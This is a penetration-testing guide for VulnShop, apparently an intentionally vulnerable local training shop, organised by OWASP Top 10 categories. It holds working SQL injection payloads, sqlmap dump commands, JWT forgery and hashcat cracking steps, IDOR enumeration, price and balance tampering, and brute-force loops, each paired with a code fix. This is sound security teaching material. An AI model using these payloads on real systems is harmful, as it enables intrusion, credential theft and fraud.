# VulnShop — Penetration Testing Guide (OWASP Top 10 **2025**)

> **For educational use only. Run locally, never expose to the internet.**

---

## OWASP Top 10 — 2025 Reference

| # | Category | Status in VulnShop |
|---|----------|--------------------|
| **A01:2025** | Broken Access Control | ✅ IDOR, JWT privilege escalation, mass assignment |
| **A02:2025** | Security Misconfiguration | ✅ Debug endpoints, permissive CORS, default creds |
| **A03:2025** | Software Supply Chain Failures | ➖ Not implemented |
| **A04:2025** | Cryptographic Failures | ✅ Plaintext passwords, weak JWT secret |
| **A05:2025** | Injection | ✅ SQL injection in product search |
| **A06:2025** | Insecure Design | ✅ Client-controlled payment price |
| **A07:2025** | Authentication Failures | ✅ No rate limiting, default credentials |
| **A08:2025** | Software or Data Integrity Failures | ➖ Not implemented |
| **A09:2025** | Security Logging and Alerting Failures | ✅ Zero security events logged |
| **A10:2025** | Mishandling of Exceptional Conditions | ✅ Stack traces returned to client |

---

## Vulnerability Map

| OWASP 2025 | Vulnerability | Endpoint |
|------------|--------------|----------|
| **A01** | IDOR — view any user's order | `GET /api/orders/{id}` |
| **A01** | JWT privilege escalation → admin | `GET /api/admin/users` |
| **A01** | Mass assignment — set own balance | `PUT /api/profile` |
| **A02** | Unauthenticated debug endpoints | `GET /api/debug/config` |
| **A02** | Permissive CORS (`*`) with credentials | All endpoints |
| **A04** | Plaintext password storage | `users` table in SQLite |
| **A04** | Weak JWT secret (`"secret"`) | All auth endpoints |
| **A05** | SQL injection (UNION-based) | `GET /api/products?search=` |
| **A06** | Payment bypass (client-supplied price) | `POST /api/orders` |
| **A07** | No rate limiting on login (brute-force) | `POST /api/auth/login` |
| **A09** | No security event logging anywhere | All endpoints |
| **A10** | Stack traces in 500 error responses | `POST /api/auth/register` |

---

## Exploitation Walkthroughs

---

### A05:2025 — SQL Injection (`GET /api/products?search=`)

**Vulnerable code (`main.py` ~line 241):**
```python
query = f"SELECT * FROM products WHERE name LIKE '%{search}%' OR description LIKE '%{search}%'"
```

**Step 1 — find number of columns (ORDER BY technique):**
```
?search=' ORDER BY 1--   ← OK
?search=' ORDER BY 5--   ← OK
?search=' ORDER BY 6--   ← error → table has 5 columns
```

**Step 2 — UNION SELECT to dump users (plaintext passwords):**
```
GET /api/products?search=' UNION SELECT id,username,password,email,is_admin FROM users--
```

With curl:
```bash
curl "http://localhost:8000/api/products?search=%27%20UNION%20SELECT%20id%2Cusername%2Cpassword%2Cemail%2Cis_admin%20FROM%20users--"
```

**Expected:** User rows appear mixed into product results with plaintext passwords.

**Burp Suite:**
1. Intercept `GET /api/products?search=laptop` → Send to Repeater
2. Modify `search` parameter to the UNION payload above
3. Or: Send to Scanner (Pro) — it auto-detects the injection point

**sqlmap (automated):**
```bash
sqlmap -u "http://localhost:8000/api/products?search=test" \
  --dbs --tables --dump --batch
```

**Fix:**
```python
conn.execute("SELECT * FROM products WHERE name LIKE ?", (f'%{search}%',))
```

---

### A01:2025 — IDOR (`GET /api/orders/{order_id}`)

**Vulnerable code (`main.py` ~line 311):**
```python
# No ownership check — returns any order to any authenticated user
order = conn.execute("SELECT * FROM orders WHERE id = ?", (order_id,)).fetchone()
```

**Proof of Concept:**
```bash
# Log in as alice
TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Fetch order #1 — belongs to admin, not alice
curl http://localhost:8000/api/orders/1 -H "Authorization: Bearer $TOKEN"
```

**Burp Intruder — enumerate all orders:**
1. Send `GET /api/orders/1` to Intruder
2. Mark position: `/api/orders/§1§`
3. Payload: Numbers 1–100, step 1
4. Attack → filter Status **200** → all valid orders exposed

**Fix:**
```python
if order["user_id"] != user["user_id"]:
    raise HTTPException(status_code=403, detail="Forbidden")
```

---

### A01:2025 — JWT Privilege Escalation (admin access)

**Vulnerable code (`main.py` ~line 396):**
```python
SECRET_KEY = "secret"                   # weak secret
if not user.get("is_admin"):            # trusts JWT claim, no DB check
    raise HTTPException(403)
```

**Step 1 — decode any JWT at jwt.io** to see payload structure.

**Step 2 — forge admin token (Python):**
```python
import jwt
payload = {
    "user_id": 2,
    "username": "alice",
    "is_admin": True,        # escalate privilege
    "exp": 9999999999
}
token = jwt.encode(payload, "secret", algorithm="HS256")
print(token)
```

**Step 3 — use forged token:**
```bash
curl http://localhost:8000/api/admin/users \
  -H "Authorization: Bearer <forged_token>"
# → returns all users with plaintext passwords
```

**Burp + JWT Editor extension:**
1. Install **JWT Editor** from BApp Store
2. In Repeater, open the **JSON Web Token** tab
3. Change `"is_admin": false` → `true`
4. Click **Sign** → symmetric key → enter `secret`
5. Send → 200 OK with full user list

**Crack the real secret with hashcat:**
```bash
hashcat -a 0 -m 16500 <JWT_FROM_BURP> /usr/share/wordlists/rockyou.txt
```

**Fix:** Use a strong random secret + verify role from database:
```python
SECRET_KEY = secrets.token_hex(32)
user_row = conn.execute("SELECT is_admin FROM users WHERE id=?", (uid,)).fetchone()
if not user_row["is_admin"]:
    raise HTTPException(403)
```

---

### A06:2025 — Insecure Design / Payment Bypass (`POST /api/orders`)

**Vulnerable code (`main.py` ~line 281):**
```python
# Fundamental design flaw: price comes from the client request body
total_price = data.price * data.quantity   # NOT product["price"]
```

**Burp Suite — intercept checkout:**
1. Add any product to cart, click Checkout
2. Burp intercepts `POST /api/orders` with body:
   ```json
   {"product_id": 1, "quantity": 1, "price": 1299.99}
   ```
3. Send to Repeater → change `"price": 0.01`
4. Send → Order created for $0.01

**Try negative price (gain balance):**
```bash
curl -X POST http://localhost:8000/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 1, "price": -500.0}'
```

**Fix:**
```python
total_price = product["price"] * data.quantity   # server-side price only
```

---

### A02:2025 — Security Misconfiguration (unauthenticated debug endpoints)

**Zero authentication needed:**
```bash
# Leaks JWT secret key and admin password
curl http://localhost:8000/api/debug/config

# All users + plaintext passwords
curl http://localhost:8000/api/debug/users

# All orders in the system
curl http://localhost:8000/api/debug/orders
```

**Sample `/api/debug/config` response:**
```json
{
  "secret_key": "secret",
  "algorithm": "HS256",
  "database": "shop.db",
  "debug_mode": true,
  "admin_default_password": "admin123",
  "version": "1.0.0-dev",
  "environment": "production"
}
```

**Burp — find hidden endpoints:**
- Send any request to Intruder
- Use `Content-Discovery` / `Forced Browsing` with a wordlist
- `/api/debug/config`, `/api/debug/users`, `/api/docs`, `/api/openapi.json` all respond

---

### A04:2025 — Cryptographic Failures (plaintext passwords)

```bash
# Via debug endpoint (no auth):
curl http://localhost:8000/api/debug/users
# → [{"id":1,"username":"admin","password":"admin123",...}]

# Via SQL injection in search:
curl "http://localhost:8000/api/products?search=%27%20UNION%20SELECT%20id%2Cusername%2Cpassword%2Cemail%2Cis_admin%20FROM%20users--"
```

**Fix:** Hash with bcrypt before storage:
```python
from passlib.context import CryptContext
ctx = CryptContext(schemes=["bcrypt"], deprecated="auto")
hashed = ctx.hash(plain_password)         # store this
ctx.verify(plain_password, hashed)        # verify on login
```

---

### A01:2025 — Mass Assignment (balance tampering)

**Vulnerable code (`main.py` ~line 355):**
```python
# Server accepts balance from user — no field restriction
if data.balance is not None:
    conn.execute("UPDATE users SET balance = ? WHERE id = ?", (data.balance, user["user_id"]))
```

```bash
# Set your balance to $999,999
curl -X PUT http://localhost:8000/api/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"balance": 999999}'
```

---

### A09:2025 — Security Logging and Alerting Failures

```bash
# All security events produce zero log output:
# 1. Brute-force 1000 wrong passwords — no alert, no lockout
for i in $(seq 1 20); do
  curl -s -X POST http://localhost:8000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong'$i'"}' | python3 -c "import sys,json; print(json.load(sys.stdin))"
done

# 2. Enumerate 50 order IDs — no alert
for i in $(seq 1 50); do
  curl -s http://localhost:8000/api/orders/$i -H "Authorization: Bearer $TOKEN"
done

# 3. Check the "security log" — always empty
curl http://localhost:8000/api/logs -H "Authorization: Bearer $TOKEN"
```

---

### A10:2025 — Mishandling of Exceptional Conditions (stack traces)

**Trigger a 500 error to get full stack trace:**
```bash
# Register with duplicate username to trigger IntegrityError
curl -X POST http://localhost:8000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"x","email":"x@x.com"}'

# Malformed input to trigger unhandled exception in some paths
curl -X GET "http://localhost:8000/api/products?search='"
```

The 500 response exposes: file paths, line numbers, Python version, internal logic.

---

## Attack Chains

### Chain 1: Anonymous → Full Admin Access
```
1. GET /api/debug/config → secret_key = "secret"
2. Forge JWT: {"is_admin": true, "user_id": 99}
3. GET /api/admin/users → all users with plaintext passwords
4. Log in as admin / admin123
```

### Chain 2: Regular User → Free Shopping
```
1. POST /api/auth/login as any user
2. PUT /api/profile {"balance": 999999} → infinite balance
3. POST /api/orders {"price": 0.01} → buy $1299 laptop for 1 cent
```

### Chain 3: Anonymous Data Exfiltration via SQLi
```
1. GET /api/products?search=' UNION SELECT id,username,password,email,is_admin FROM users--
2. All passwords dumped in plaintext (no cracking needed)
3. Log in as any user or admin
```

### Chain 4: Stealth Attack (A09 enables it)
```
Any of the above chains runs completely undetected:
- No failed login counter
- No IDOR alert
- No SQLi detection
- No rate limiting
- No audit trail
```

---

## Burp Suite Workflow

| Tool | Vulnerability | Steps |
|------|--------------|-------|
| **Repeater** | IDOR, payment bypass, JWT forgery | Modify request manually, resend |
| **Intruder** | Order enumeration, brute-force login | Number/wordlist payloads |
| **Scanner** (Pro) | SQLi auto-detection | Active scan on search endpoint |
| **JWT Editor** (BApp) | Token forgery | Edit + re-sign with `"secret"` |
| **Decoder** | JWT manual decode | Base64 decode each segment |
| **Logger** | Track all background requests | Watch for unintended calls |

---

## Fix Summary

```python
# A04: Hash passwords
from passlib.context import CryptContext
ctx = CryptContext(schemes=["bcrypt"])
ctx.hash(password); ctx.verify(plain, hash)

# A04: Strong JWT secret
SECRET_KEY = secrets.token_hex(32)

# A05: Parameterized queries
conn.execute("SELECT * FROM products WHERE name LIKE ?", (f'%{search}%',))

# A01 IDOR: ownership check
if order["user_id"] != user["user_id"]:
    raise HTTPException(403)

# A01 JWT: verify role from DB
row = conn.execute("SELECT is_admin FROM users WHERE id=?", (uid,)).fetchone()

# A06: Server-side price
total_price = product["price"] * data.quantity

# A02: Remove debug endpoints entirely in production

# A09: Log security events
import logging
logging.warning(f"FAILED_LOGIN user={username} ip={request.client.host}")

# A10: Generic error responses
raise HTTPException(status_code=500, detail="Internal server error")
```
